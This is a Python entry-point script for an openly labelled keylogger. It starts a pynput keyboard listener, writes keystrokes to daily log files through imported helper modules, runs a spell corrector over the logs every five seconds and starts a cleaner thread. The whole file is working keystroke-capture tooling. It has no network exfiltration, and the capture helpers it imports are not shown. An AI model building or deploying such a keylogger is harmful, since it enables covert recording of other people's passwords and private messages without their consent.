from pynput.keyboard import Listener
import threading
import os
import time

from keylogger import write_to_file, on_release, set_log_file_getter, periodic_cleaner
from spell_corrector import correct_word
from log_creator import start_log_creator

LOGS_FOLDER = "logs"

def periodic_text_corrector(log_creator):
    """Correct and clean text content periodically"""
    while True:
        if not os.path.exists(__file__):
            print("Script file deleted, stopping corrector.")
            break

        current_log = log_creator.get_current_log_file()
        
        if current_log and os.path.exists(current_log):
            try:
                with open(current_log, "r", encoding="utf-8") as file:
                    content = file.read()

                corrected_content = correct_word(content)

                with open(current_log, "w", encoding="utf-8") as file:
                    file.write(corrected_content)
            except Exception as e:
                print(f"Error in periodic_text_corrector: {e}")

        time.sleep(5)  # Correct every 5 seconds

if __name__ == "__main__":
    print("Starting keylogger with daily log creation...")
    
    # Start log creator
    log_creator = start_log_creator(LOGS_FOLDER)
    print(f"Log folder created at: {LOGS_FOLDER}")
    print(f"Current log file: {log_creator.get_current_log_file()}")
    
    # Set the log file getter for keylogger
    set_log_file_getter(log_creator.get_current_log_file)
    
    # Start keylogger listener
    listener = Listener(on_press=write_to_file, on_release=on_release)
    listener.start()
    print("Keylogger started. Press ESC to stop.")

    # Start cleaner thread (removes spacebar text every 5 seconds)
    cleaner_thread = threading.Thread(target=periodic_cleaner, daemon=True)
    cleaner_thread.start()

    listener.join()
